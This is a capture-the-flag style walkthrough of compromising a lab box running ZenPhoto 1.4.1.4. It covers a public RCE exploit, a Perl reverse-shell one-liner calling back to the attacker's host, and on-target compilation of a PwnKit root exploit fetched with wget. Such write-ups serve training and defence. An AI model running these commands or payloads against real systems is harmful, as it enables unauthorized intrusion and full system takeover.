#Linux #ZenPhoto #RCE #CVE #PwnKit #CVE-2021-4034 #Gobuster #PHP

## Overview

ZenPhoto is a Linux box running a dated version of the ZenPhoto gallery application, exploitable through a known Remote Code Execution vulnerability that grants a `www-data` shell. Privilege escalation is PwnKit (CVE-2021-4034), compiled on-target from a downloaded zip, the full C compilation path, unlike Snookums where compilation failed and the Python variant was needed.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian (Ubuntu)
23/tcp   open  ipp     CUPS 1.4  (403 Forbidden)
80/tcp   open  http    Apache httpd 2.2.14 (Ubuntu)
3306/tcp open  mysql
```

Port 23 is CUPS (printing), not Telnet. HTTP on 80 is the entry point.

### Web Enumeration

The web root returned only "UNDER CONTRUCTION". Gobuster found the application:

```sh
gobuster dir -u http://192.168.176.41/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/test  (Status: 301)
```

`/test` served a ZenPhoto gallery. Page source revealed the version:

```
zenphoto version 1.4.1.4 [8157] (Official Build)
```

## Foothold

### ZenPhoto 1.4.1.4 RCE (EDB-18083)

Searching ExploitDB for the version number surfaces:

**ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution**  
`https://www.exploit-db.com/exploits/18083`

The exploit is a PHP script. I renamed it to `zen.php` and ran it against the target, specifying the ZenPhoto install path:

```sh
php zen.php 192.168.176.41 /test/
```

Output:

```sh
+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami
www-data
```

The exploit provides a restricted pseudo-shell. Perl was available on the host, so I used it to pivot to a proper reverse shell:

```sh
zenphoto-shell# which perl
/usr/bin/perl
```

```perl
perl -e 'use Socket;$i="192.168.45.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Full shell received:

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.176.41] 50906
bash: no job control in this shell
www-data@offsecsrv:/...$ whoami
www-data
```

> **Why old gallery software is dangerous:** ZenPhoto 1.4.1.4 dates to 2011. The `ajax_create_folder.php` file accepted an unsanitized folder name that was passed to PHP's `preg_replace` with the `/e` modifier, a deprecated feature that evaluates the replacement string as PHP code. A crafted request makes the server execute arbitrary PHP. Applications that have not been updated in over a decade routinely carry vulnerabilities with working public exploits.

## Privilege Escalation

### PwnKit (CVE-2021-4034) via C Compilation

LinPEAS identified the host as a candidate for CVE-2021-4034. Unlike Snookums, this box had a working compiler, so the full C exploit compiled cleanly:

```sh
# on Kali
wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip
python3 -m http.server 80
```

```sh
# on target
wget http://192.168.45.244/pwnkit.zip
www-data@offsecsrv:/tmp$ unzip pwnkit.zip
www-data@offsecsrv:/tmp$ cd CVE-2021-4034-main
www-data@offsecsrv:/tmp/CVE-2021-4034-main$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
```

Running the compiled binary:

```sh
www-data@offsecsrv:/tmp/CVE-2021-4034-main$ ./cve-2021-4034
whoami
root
```

## Root

```sh
cat proof.txt
‹redacted›
```

## Takeaways

- **Version numbers in page source are gift-wrapped vulnerability hints.** The ZenPhoto version string was in the HTML; one ExploitDB search turned it into a working RCE.
- **Restricted exploit shells are starting points, not endings.** The ZenPhoto shell gave RCE; Perl converted that into a proper reverse shell for post-exploitation work.
- **PwnKit works on anything with a vulnerable polkit and a local user.** `www-data` is still a local user; the exploit does not require an interactive login account.
